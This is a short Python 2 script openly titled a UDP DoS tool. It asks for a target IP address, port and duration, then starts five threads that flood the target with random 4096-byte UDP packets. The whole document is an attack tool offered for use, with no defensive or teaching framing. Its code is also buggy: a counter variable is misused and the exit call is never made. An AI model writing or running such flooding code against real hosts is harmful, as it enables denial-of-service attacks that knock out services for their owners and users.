#Created by LeoDaVinci
import time
import socket
import random
import threading
import sys

print "Welcome to Leo's UDP DoS tool! Please input your tagets IP, Port number (ex 80), and ammont of time in seconds for attack. "

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(4096)

victim  = raw_input('Enter your targets ip: ')
vport = raw_input('Enter \"UDP\" Port number: ')
duration  = raw_input('Time for attack in seconds: ')
sent = 0

def worker(victim, vport):
    print "hey"
    while 1 == 1:
        client.sendto(bytes, (victim, int(vport)))
        sent = sent + 1
        print "%s sent packages, Hitting, %s on port, %s "%(sent, victim, vport)

threads = []




for i in range (5):
    t = threading.Thread(name=i, target=worker, args=(victim, vport,))
    t.start()
        
time.sleep(float(duration))


sys.exit

